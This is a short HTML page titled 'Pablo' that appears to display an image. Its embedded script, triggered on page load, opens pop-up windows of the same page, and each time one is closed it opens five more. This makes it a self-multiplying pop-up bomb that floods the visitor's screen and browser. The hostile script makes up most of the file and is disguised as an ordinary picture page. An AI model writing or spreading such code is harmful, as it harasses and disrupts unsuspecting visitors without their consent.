<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pablo</title>
    <script>
        function spawnWindows(count) {
            for (let i = 0; i < count; i++) {
                let x = Math.floor(Math.random() * (screen.availWidth - 220)); // Random X
                let y = Math.floor(Math.random() * (screen.availHeight - 220)); // Random Y

                let newWin = window.open(window.location.href, "", `width=200,height=200,left=${x},top=${y}`);
                if (!newWin) return; // Stop if pop-ups are blocked

                // Move to ensure it's positioned correctly
                setTimeout(() => {
                    try {
                        newWin.moveTo(x, y);
                    } catch (e) {
                        console.error("Window move blocked:", e);
                    }
                }, 100);

                // When this window is closed, open 5 more!
                let checkClosed = setInterval(() => {
                    if (newWin.closed) {
                        clearInterval(checkClosed);
                        spawnWindows(5); // Open 5 new windows when closed
                    }
                }, 500);
            }
        }

        window.onload = () => setTimeout(() => spawnWindows(1), 500); // Start with 1 window
    </script>
</head>
<body>
    <h1>Pablo</h1>
    <img src="https://github.com/monosourcil3000/mYpC/Pablo.png" />
</body>
</html>
